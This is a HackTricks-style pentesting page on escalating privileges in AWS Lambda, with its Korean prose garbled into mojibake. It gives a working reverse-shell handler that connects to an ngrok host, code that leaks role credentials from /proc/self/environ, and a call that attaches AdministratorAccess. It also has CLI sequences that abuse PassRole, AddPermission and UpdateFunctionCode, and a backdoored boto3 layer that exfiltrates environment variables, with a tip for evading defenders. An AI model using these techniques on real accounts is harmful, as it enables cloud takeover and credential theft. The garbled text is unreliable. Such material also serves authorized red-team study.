# AWS - Lambda Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ <strong>ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong>!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ë‹¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—™ ë ˆí¬ì— ì œì¶œí•˜ì„¸ìš”.

</details>

## lambda

Lambdaì— ëŒ€í•œ ìì„¸í•œ ì •ë³´:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`, ê·¸ë¦¬ê³  `lambda:InvokeFunction`** ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìëŠ” ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ë“¤ì€ **ìƒˆë¡œìš´ Lambda í•¨ìˆ˜ë¥¼ ìƒì„±í•˜ê³  ê¸°ì¡´ IAM ì—­í• ì„ í• ë‹¹**í•˜ì—¬ í•´ë‹¹ ì—­í• ê³¼ ê´€ë ¨ëœ ê¶Œí•œì„ í•¨ìˆ˜ì— ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚¬ìš©ìëŠ” ì´í›„ **ì´ Lambda í•¨ìˆ˜ì— ì½”ë“œë¥¼ ì‘ì„±í•˜ê³  ì—…ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: ì—­ì‰˜).\
í•¨ìˆ˜ê°€ ì„¤ì •ë˜ë©´ ì‚¬ìš©ìëŠ” Lambda í•¨ìˆ˜ë¥¼ **íŠ¸ë¦¬ê±°**í•˜ê³  ì˜ë„í•œ ì‘ì—…ì„ AWS APIë¥¼ í†µí•´ í˜¸ì¶œí•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ ì‚¬ìš©ìê°€ Lambda í•¨ìˆ˜ë¥¼ í†µí•´ ê°„ì ‘ì ìœ¼ë¡œ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê³ , í•´ë‹¹ í•¨ìˆ˜ì™€ ê´€ë ¨ëœ IAM ì—­í• ì— ë¶€ì—¬ëœ ì•¡ì„¸ìŠ¤ ìˆ˜ì¤€ìœ¼ë¡œ ì‘ë™í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.\\

ê³µê²©ìëŠ” ì´ë¥¼ ì•…ìš©í•˜ì—¬ **ì—­ì‰˜ì„ íšë“¤í•˜ê³  í† í°ì„ ë„ë‚œë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
ë‹¹ì‹ ì€ ëŒë‹¤ í•¨ìˆ˜ ìì²´ì—ì„œ ëŒë‹¤ ì—­í•  ê¶Œí•œì„ **ë‚¨ìš©**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.\
ë§Œì•½ ëŒë‹¤ ì—­í• ì´ ì¶©ë¶„í•œ ê¶Œí•œì„ ê°–ê³  ìˆë‹¤ë©´ ê·¸ê²ƒì„ ì‚¬ìš©í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
ëŒë‹¤ì˜ ì—­í•  ìê²© ì¦ëª…ì„ ì™¸ë¶€ ì—°ê²° ì—†ì´ ëˆ„ì¶œí•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ëŠ” ë‚´ë¶€ ì‘ì—…ì— ì‚¬ìš©ë˜ëŠ” **ë„¤íŠ¸ì›Œí¬ ê²©ë¦¬ëœ ëŒë‹¤**ì— ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ ì•Œ ìˆ˜ ì—†ëŠ” ë³´ì•ˆ ê·¸ë£¹ì´ ì—­ìˆœ ì‰˜ì„ í•„í„°ë§í•˜ëŠ” ê²½ìš°, ì´ ì½”ë“œ ì¡°ê°ì„ ì‚¬ìš©í•˜ì—¬ ëŒë‹¤ì˜ ì¶œë ¥ìœ¼ë¡œ ìê²© ì¦ëª…ì„ ì§ì ‘ ëˆ„ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**ì ì¬ì  ì˜í–¥:** ì§€ì •ëœ ì„ì˜ì˜ ëŒë‹¤ ì„œë¹„ìŠ¤ ì—­í• ì— ëŒ€í•œ ì§ì ‘ ê¶Œí•œ ìƒìŠ¹

{% hint style="danger" %}
í¥ë¯¸ë¡œì›Œ ë³´ì¼ ìˆ˜ ìˆì§€ë§Œ **`lambda:InvokeAsync`**ì€ **`aws lambda invoke-async`ë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ë…ìì ìœ¼ë¡œ í—ˆìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.** `lambda:InvokeFunction`ë„ í•„ìš”í•©ë‹ˆë‹¤.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

ì´ì „ ì‹œë‚˜ë¦¬ì˜¤ì™€ ë§ˆì°¬ê°€ì§€ë¡œ, **`lambda:AddPermission`** ê¶Œí•œì´ ìˆë‹¤ë©´ **`lambda:InvokeFunction` ê¶Œí•œì„ ìŠ¤ìŠ¤ë¡œ ë¶€ì—¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**ì ì¬ì  ì˜í–¥:** ì§€ì •ëœ ì„ì˜ì˜ ëŒë‹¤ ì„œë¹„ìŠ¤ ì—­í• ë¡œì˜ ì§ì ‘ ê¶Œí•œ ìƒìŠ¹.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, ê·¸ë¦¬ê³  `lambda:CreateEventSourceMapping`** ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ì(ê·¸ë¦¬ê³  ì ì¬ì ìœ¼ë¡œ `dynamodb:PutItem` ê·¸ë¦¬ê³  `dynamodb:CreateTable`)ëŠ” `lambda:InvokeFunction` ì—†ì´ë„ ê°„ì ‘ì ìœ¼ë¡œ **ê¶Œí•œì„ ìƒìŠ¹**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ë“¤ì€ ì•…ì˜ì ì¸ ì½”ë“œë¥¼ í¬í•¨í•œ Lambda í•¨ìˆ˜ë¥¼ ìƒì„±í•˜ê³  ê¸°ì¡´ IAM ì—­í• ì— í• ë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ëŒë‹¤ë¥¼ ì§ì ‘ í˜¸ì¶œí•˜ëŠ” ëŒ€ì‹ , ì‚¬ìš©ìëŠ” DynamoDB í…Œì´ë¸”ì„ ì„¤ì •í•˜ê±°ë‚˜ ê¸°ì¡´ í…Œì´ë¸”ì„ í™œìš©í•˜ì—¬ í•´ë‹¹ í…Œì´ë¸”ì„ Lambdaì— ì´ë²¤íŠ¸ ì†ŒìŠ¤ ë§¤í•‘ì„ í†µí•´ ì—°ê²°í•©ë‹ˆë‹¤. ì´ ì„¤ì •ì€ Lambda í•¨ìˆ˜ê°€ í…Œì´ë¸”ì— ìƒˆë¡œìš´ í•­ëª©ì´ ì…ë ¥ë  ë•Œ ìë™ìœ¼ë¡œ **íŠ¸ë¦¬ê±°**ë˜ë„ë¡ ë³´ì¥í•˜ë©°, ì´ëŠ” ì‚¬ìš©ìì˜ ì‘ì—…ì´ë‚˜ ë‹¤ë¥¸ í”„ë¡œì„¸ìŠ¤ì— ì˜í•´ ê°„ì ‘ì ìœ¼ë¡œ Lambda í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ì „ë‹¬ëœ IAM ì—­í• ì˜ ê¶Œí•œìœ¼ë¡œ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
ë§Œì•½ DynamoDBê°€ ì´ë¯¸ AWS í™˜ê²½ì—ì„œ í™œì„±í™”ë˜ì–´ ìˆë‹¤ë©´, ì‚¬ìš©ìëŠ” Lambda í•¨ìˆ˜ë¥¼ ìœ„í•´ ì´ë²¤íŠ¸ ì†ŒìŠ¤ ë§¤í•‘ì„ ì„¤ì •í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ DynamoDBê°€ ì‚¬ìš©ë˜ê³  ìˆì§€ ì•Šë‹¤ë©´, ì‚¬ìš©ìëŠ” ìŠ¤íŠ¸ë¦¬ë°ì´ í™œì„±í™”ëœ ìƒˆ í…Œì´ë¸”ì„ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
ì§€ê¸ˆì€ **ì´ë²¤íŠ¸ ì†ŒìŠ¤ ë§¤í•‘ì„ ìƒì„±**í•˜ì—¬ **ëŒë‹¤ í•¨ìˆ˜ë¥¼ ë‹¤ì´ë‚˜ëª¨DB í…Œì´ë¸”ì— ì—°ê²°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda í•¨ìˆ˜ê°€ DynamoDB ìŠ¤íŠ¸ë¦¼ì— ì—°ê²°ë˜ì–´ ìˆìœ¼ë©´, ê³µê²©ìëŠ” DynamoDB ìŠ¤íŠ¸ë¦¼ì„ í™œì„±í™”ì‹œí‚´ìœ¼ë¡œì¨ Lambdaë¥¼ ê°„ì ‘ì ìœ¼ë¡œ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” DynamoDB í…Œì´ë¸”ì— í•­ëª©ì„ ì‚½ì…í•¨ìœ¼ë¡œì¨ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**ì ì¬ì  ì˜í–¥:** ì§€ì •ëœ ëŒë‹¤ ì„œë¹„ìŠ¤ ì—­í• ë¡œì˜ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### `lambda:AddPermission`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ìì‹ ì—ê²Œ (ë˜ëŠ” ë‹¤ë¥¸ ì‚¬ëŒì—ê²Œ) ì–´ë–¤ ê¶Œí•œì´ë“  ë¶€ì—¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì´ëŠ” ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ê¸° ìœ„í•´ ë¦¬ì†ŒìŠ¤ ê¸°ë°˜ ì •ì±…ì„ ìƒì„±í•¨):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**ì ì¬ì ì¸ ì˜í–¥:** ì½”ë“œë¥¼ ìˆ˜ì •í•˜ê³  ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ë¶€ì—¬í•˜ì—¬ ëŒë‹¤ ì„œë¹„ìŠ¤ ì—­í• ë¡œ ì§ì ‘ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### `lambda:AddLayerVersionPermission`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ìì‹  (ë˜ëŠ” ë‹¤ë¥¸ ì‚¬ëŒ)ì—ê²Œ `lambda:GetLayerVersion` ê¶Œí•œì„ ë¶€ì—¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŠ” ë ˆì´ì–´ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ ì·¨ì•½ì ì´ë‚˜ ë¯¼ê°í•œ ì •ë³´ë¥¼ íƒìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**ì ì¬ì ì¸ ì˜í–¥:** ë¯¼ê°í•œ ì •ë³´ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê°€ëŠ¥ì„±.

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìëŠ” **IAM ì—­í• ì— ì—°ê²°ëœ ê¸°ì¡´ ëŒë‹¤ í•¨ìˆ˜ì˜ ì½”ë“œë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ì ì¬ë ¥**ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.\
ê³µê²©ìëŠ” **IAM ìê²© ì¦ëª…ì„ ìœ ì¶œí•˜ê¸° ìœ„í•´ ëŒë‹¤ì˜ ì½”ë“œë¥¼ ìˆ˜ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê³µê²©ìëŠ” í•¨ìˆ˜ë¥¼ ì§ì ‘ í˜¸ì¶œí•  ìˆ˜ ì—†ì„ ìˆ˜ ìˆì§€ë§Œ, ëŒë‹¤ í•¨ìˆ˜ê°€ ì´ë¯¸ ì¡´ì¬í•˜ê³  ì‘ë™ ì¤‘ì¸ ê²½ìš° ê¸°ì¡´ì˜ ì›Œí¬í”Œë¡œ ë˜ëŠ” ì´ë²¤íŠ¸ë¥¼ í†µí•´ ìˆ˜ì •ëœ ì½”ë“œì˜ ì‹¤í–‰ì„ ê°„ì ‘ì ìœ¼ë¡œ ìš©ì´í•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**ì ì¬ì  ì˜í–¥:** ì‚¬ìš©ëœ ëŒë‹¤ ì„œë¹„ìŠ¤ ì—­í• ë¡œì˜ ì§ì ‘ ê¶Œí•œ ìƒìŠ¹.

### `lambda:UpdateFunctionConfiguration`

#### ì†Œê°œ

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html)ë¥¼ ì‚¬ìš©í•˜ë©´ ëŒë‹¤ í•¨ìˆ˜ì— **ì½”ë“œë¥¼ í¬í•¨**í•  ìˆ˜ ìˆì§€ë§Œ **ë³„ë„ë¡œ ì €ì¥**í•˜ì—¬ í•¨ìˆ˜ ì½”ë“œë¥¼ ì‘ê²Œ ìœ ì§€í•˜ê³  **ì—¬ëŸ¬ í•¨ìˆ˜ê°€ ì½”ë“œë¥¼ ê³µìœ **í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ëŒë‹¤ ë‚´ë¶€ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŒì´ì¬ ì½”ë“œê°€ ë¡œë“œëœ ê²½ë¡œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
ë‹¤ìŒì€ ìœ„ì¹˜ì…ë‹ˆë‹¤:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

ì˜ˆë¥¼ ë“¤ì–´, ë¼ì´ë¸ŒëŸ¬ë¦¬ boto3ëŠ” `/var/runtime/boto3` (4ë²ˆì§¸ ìœ„ì¹˜)ì—ì„œ ë¡œë“œë©ë‹ˆë‹¤.

#### Exploitation

**í•¨ìˆ˜ì— ë ˆì´ì–´ë¥¼ ì²¨ë¶€**í•˜ëŠ” ê²ƒì€ `lambda:UpdateFunctionConfiguration` ê¶Œí•œë§Œ í•„ìš”í•˜ë©° **ë ˆì´ì–´ëŠ” ê³„ì •ê°„ì— ê³µìœ **ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ **ê·¸ë“¤ì´ ì‚¬ìš©í•˜ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•Œì•„ì•¼** í•˜ë¯€ë¡œ ì˜¬ë°”ë¥´ê²Œ ë®ì–´ì“¸ ìˆ˜ ìˆì§€ë§Œ, ì´ ì˜ˆì—ì„œëŠ” **ê³µê²© ëŒ€ìƒ í•¨ìˆ˜ê°€ boto3ë¥¼ ê°€ì ¸ì˜¤ê³  ìˆë‹¤ê³  ê°€ì •**í•©ë‹ˆë‹¤.

ì•ˆì „ì„ ìœ„í•´, ìš°ë¦¬ëŠ” Pipì„ ì‚¬ìš©í•˜ì—¬ ëŒ€ìƒ í•¨ìˆ˜ì—ì„œ ì‚¬ìš© ì¤‘ì¸ Lambda ëŸ°íƒ€ì„ì˜ boto3 ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€ ë™ì¼í•œ ë²„ì „ì„ ì„¤ì¹˜í•  ê²ƒì…ë‹ˆë‹¤ (Python 3.7), ëŒ€ìƒ í•¨ìˆ˜ì—ì„œ ë¬¸ì œë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ê²ƒì´ ì—†ë„ë¡ í•˜ê¸° ìœ„í•¨ì…ë‹ˆë‹¤. í˜„ì¬ ëŸ°íƒ€ì„ì€ boto3 ë²„ì „ 1.9.42ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

ë‹¤ìŒ ì½”ë“œë¡œ boto3 ë²„ì „ 1.9.42 ë° í•´ë‹¹ ì¢…ì†ì„±ì„ ë¡œì»¬ "lambda\_layer" í´ë”ì— ì„¤ì¹˜í•  ê²ƒì…ë‹ˆë‹¤:
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
ë‹¤ìŒìœ¼ë¡œ, `/lambda_layer/boto3/__init__.py`ë¥¼ ì—´ê³  ì•…ì˜ì ì¸ ì½”ë“œë¥¼ ì¶”ê°€í•©ë‹ˆë‹¤. ì¶”ê°€í•  payloadëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

![](<../../../.gitbook/assets/image (26).png>)

`requests`ëŠ” `botocore`ì—ì„œ ê°€ì ¸ì˜¤ê³  ìˆìŠµë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” í™˜ê²½ ë³€ìˆ˜ë¥¼ ìœ ì¶œí•˜ë©°, try-except ë° 0.1 íƒ€ì„ì•„ì›ƒì€ ì´ ì½”ë“œê°€ ì•„ë¬´ ë¬¸ì œ ì—†ì´ ì‘ë™í•˜ë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤.

{% hint style="info" %}
**ì¤‘ìš” ë…¸íŠ¸:** ì‹¤ì œ íœí…ŒìŠ¤íŠ¸ì—ì„œëŠ” ë” ì´ìƒ `from botocore.vendored import requests`ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šì•„ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” í•´ë‹¹ í•¨ìˆ˜ì˜ CloudWatch ë¡œê·¸ì— "DeprecationWarning"ì´ ì¶œë ¥ë˜ì–´ ë°©ì–´ìì—ê²Œ ë“¤í‚¬ ê°€ëŠ¥ì„±ì´ ë†’ì•„ì§‘ë‹ˆë‹¤.
{% endhint %}

ì´ì œ ì´ ì½”ë“œë¥¼ **ZIP íŒŒì¼**ë¡œ ë¬¶ì–´ì„œ **ê³µê²©ì ê³„ì •ì˜ ìƒˆë¡œìš´ Lambda ë ˆì´ì–´ì— ì—…ë¡œë“œ**í•©ë‹ˆë‹¤. ë¨¼ì € "python" í´ë”ë¥¼ ë§Œë“¤ê³  ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë„£ì–´ì•¼ í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ Lambdaì— ì—…ë¡œë“œí•œ í›„ ì½”ë“œê°€ "/opt/python/boto3"ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, ë ˆì´ì–´ê°€ Python 3.7ê³¼ í˜¸í™˜ë˜ë„ë¡ í•˜ê³ , **ë ˆì´ì–´ê°€ ëŒ€ìƒ í•¨ìˆ˜ì™€ ë™ì¼í•œ ì§€ì—­ì— ìˆëŠ”ì§€ í™•ì¸**í•˜ì‹­ì‹œì˜¤. ì´ ì‘ì—…ì´ ì™„ë£Œë˜ë©´ `lambda:AddLayerVersionPermission`ì„ ì‚¬ìš©í•˜ì—¬ **ë ˆì´ì–´ë¥¼ ê³µê°œì ìœ¼ë¡œ ì ‘ê·¼ ê°€ëŠ¥**í•˜ê²Œ ë§Œë“¤ì–´ ëŒ€ìƒ ê³„ì •ì´ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì´ API í˜¸ì¶œì—ëŠ” ê°œì¸ AWS ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
ì´ì œ **ì¹¨í•´ë‹¹í•œ ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•˜ì—¬ ëŒ€ìƒ ëŒë‹¤ í•¨ìˆ˜ "s3-getter"ì—ì„œ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ **ë‹¤ë¥¸ ê³„ì •ì˜ ëŒë‹¤ ë ˆì´ì–´ë¥¼ ì—°ê²°**í•©ë‹ˆë‹¤.
```bash
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
ë‹¤ìŒ ë‹¨ê³„ëŠ” **í•¨ìˆ˜ë¥¼ ì§ì ‘ í˜¸ì¶œ**í•˜ê±°ë‚˜ ì¼ë°˜ì ì¸ ë°©ë²•ìœ¼ë¡œ **í˜¸ì¶œë  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ëŠ” ê²ƒ** ì¤‘ í•˜ë‚˜ì—¬ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” ë” ì•ˆì „í•œ ë°©ë²•ì…ë‹ˆë‹¤.

**ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë” ì€ë°€í•œ ë°©ë²•**ì€ ë‹¤ìŒì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**ì ì¬ì ì¸ ì˜í–¥:** ì‚¬ìš©ëœ ëŒë‹¤ ì„œë¹„ìŠ¤ ì—­í• ë¡œì˜ ì§ì ‘ ê¶Œí•œ ìƒìŠ¹.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

ì´ëŸ¬í•œ ê¶Œí•œì„ ê°€ì§€ê³  ìˆìœ¼ë©´ í•¨ìˆ˜ë¥¼ ìƒì„±í•˜ê³  URLì„ í˜¸ì¶œí•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤... í•˜ì§€ë§Œ ì €ëŠ” ì´ë¥¼ í…ŒìŠ¤íŠ¸í•  ë°©ë²•ì„ ì°¾ì§€ ëª»í–ˆìœ¼ë¯€ë¡œ ê°€ëŠ¥í•˜ë‹¤ë©´ ì œê²Œ ì•Œë ¤ì£¼ì„¸ìš”!

### ëŒë‹¤ MitM

ì¼ë¶€ ëŒë‹¤ëŠ” **ì‚¬ìš©ìë¡œë¶€í„° ë§¤ê°œë³€ìˆ˜ë¡œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ë°›ì„ ê²ƒ**ì…ë‹ˆë‹¤. ê·¸ ì¤‘ í•˜ë‚˜ì—ì„œ RCEë¥¼ ì–»ìœ¼ë©´, ë‹¤ë¥¸ ì‚¬ìš©ìê°€ ë³´ë‚´ëŠ” ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## ì°¸ê³  ìë£Œ

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ì˜ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”**!</summary>

